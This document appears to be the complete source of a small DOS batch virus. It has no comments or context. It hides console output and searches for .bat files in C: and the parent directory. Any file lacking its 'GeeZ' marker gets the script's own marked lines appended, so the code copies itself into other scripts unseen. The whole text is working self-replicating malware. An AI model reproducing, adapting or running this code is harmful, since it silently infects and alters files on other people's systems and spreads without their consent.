ctty nul%_GeeZ%
for %%a in (C:*.bat ..\*.bat) do set GeeZ=%%a
find "GeeZ"<%GeeZ%
if errorlevel 1 find "GeeZ"<%0.BAT>>%GeeZ%
ctty con%_GeeZ%
